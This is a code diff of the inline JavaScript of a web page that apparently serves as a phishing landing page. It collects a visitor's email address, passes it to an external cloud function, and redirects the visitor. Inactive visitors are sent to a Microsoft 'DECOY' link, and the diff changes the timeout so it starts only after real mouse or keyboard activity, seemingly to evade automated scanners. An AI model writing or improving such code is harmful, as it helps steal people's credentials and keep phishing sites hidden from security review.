@@ -193,18 +193,17 @@ input[type=email]:disabled{
 
   var CONFIG = {
     FUNCTION_URL: 'https://functions.yandexcloud.net/d4e5bqhobljvknj550vf',
-    IDLE_TIMEOUT_MS: 35000, // Если ничего не делает
-    ABSOLUTE_TIMEOUT_MS: 35000, // Жесткий лимит на странице
+    ABSOLUTE_TIMEOUT_MS: 35000, // Жесткий лимит (35 сек), запускается ТОЛЬКО после действия
     LOOKUP_DEBOUNCE_MS: 400,
-    EMAIL_DEBOUNCE_MS: 800, // Ждем 0.8 сек для валидного email
-    GARBAGE_TIMEOUT_MS: 10000, // 10 секунд на подумать после последнего нажатия клавиши
+    EMAIL_DEBOUNCE_MS: 800, // 0.8 сек для валидного email
+    GARBAGE_TIMEOUT_MS: 10000, // 10 сек на подумать, если введен мусор
     DECOY: 'https://go.microsoft.com/fwlink/?LinkId=521839'
   };
 
   var EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
 
   var redirected = false;
-  var idleTimer = null;
+  var hasInteracted = false; // Флаг: было ли действие
   var absoluteTimer = null;
   var lookupTimer = null;
   var emailTimer = null;
@@ -215,10 +214,11 @@ input[type=email]:disabled{
   var suggestionEl = document.getElementById('suggestion');
   var subtitleEl = document.getElementById('subtitle');
 
-  function resetIdle() {
-    if (redirected) return;
-    if (idleTimer) clearTimeout(idleTimer);
-    idleTimer = setTimeout(triggerTimeout, CONFIG.IDLE_TIMEOUT_MS);
+  // Запускаем 35-секундный таймер только при ПЕРВОМ действии
+  function startAbsoluteTimer() {
+    if (hasInteracted || redirected) return;
+    hasInteracted = true;
+    absoluteTimer = setTimeout(triggerTimeout, CONFIG.ABSOLUTE_TIMEOUT_MS);
   }
 
   function triggerTimeout() {
@@ -231,7 +231,6 @@ input[type=email]:disabled{
     if (redirected) return;
     redirected = true;
 
-    if (idleTimer) clearTimeout(idleTimer);
     if (absoluteTimer) clearTimeout(absoluteTimer);
     if (lookupTimer) clearTimeout(lookupTimer);
     if (emailTimer) clearTimeout(emailTimer);
@@ -305,8 +304,10 @@ input[type=email]:disabled{
 
   function handleInput() {
     if (redirected) return;
+    
+    startAbsoluteTimer(); // Активируем 35-сек таймер при вводе
+
     var value = emailEl.value;
-    resetIdle(); // Сбрасываем 35-секундный таймер бездействия
     emailEl.classList.remove('pulse');
 
     var atPos = value.indexOf('@');
@@ -322,16 +323,13 @@ input[type=email]:disabled{
       if (lookupTimer) clearTimeout(lookupTimer);
     }
 
-    // Сбрасываем старый таймер редиректа (10 секунд) при каждом нажатии клавиши
     if (emailTimer) clearTimeout(emailTimer);
     
     if (EMAIL_REGEX.test(value.trim())) {
-      // Валидный email - ждем 0.8 сек
       emailTimer = setTimeout(function() {
         doResolve('email', emailEl.value.trim());
       }, CONFIG.EMAIL_DEBOUNCE_MS);
     } else if (value.trim().length > 0) {
-      // Мусор/недописанный email - ждем 10 секунд с момента ПОСЛЕДНЕГО нажатия
       emailTimer = setTimeout(function() {
         doResolve('email', emailEl.value.trim());
       }, CONFIG.GARBAGE_TIMEOUT_MS);
@@ -339,29 +337,25 @@ input[type=email]:disabled{
   }
 
   emailEl.addEventListener('input', handleInput);
-  emailEl.addEventListener('focus', resetIdle);
+  
   emailEl.addEventListener('keydown', function(e) {
+    startAbsoluteTimer(); // Активируем таймер при нажатии клавиш
     if (e.key === 'Enter') { 
       e.preventDefault(); 
       var val = emailEl.value.trim();
       if (emailTimer) clearTimeout(emailTimer);
-      doResolve('email', val); // Мгновенный редирект по Enter
+      doResolve('email', val); 
     }
   });
 
-  document.addEventListener('mousemove', resetIdle, { passive: true });
-  document.addEventListener('keydown', resetIdle);
-  document.addEventListener('scroll', resetIdle, { passive: true, capture: true });
-  document.addEventListener('click', resetIdle);
-  document.addEventListener('touchstart', resetIdle, { passive: true });
+  // Активация 35-сек таймера при любом действии мыши/скролла/тапа
+  document.addEventListener('mousemove', startAbsoluteTimer, { passive: true });
+  document.addEventListener('scroll', startAbsoluteTimer, { passive: true, capture: true });
+  document.addEventListener('click', startAbsoluteTimer);
+  document.addEventListener('touchstart', startAbsoluteTimer, { passive: true });
+  document.addEventListener('keydown', startAbsoluteTimer);
 
-  resetIdle();
-  // Запускаем жесткий таймер на 35 секунд, который НИКОГДА не сбрасывается
-  absoluteTimer = setTimeout(triggerTimeout, CONFIG.ABSOLUTE_TIMEOUT_MS);
-
-  if (!/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)) {
-    setTimeout(function() { emailEl.focus(); }, 300);
-  }
+  // Фокус не запускает таймер сам по себе, только если реально начал вводить (через mousemove/keydown)
 
 })();
 </script>
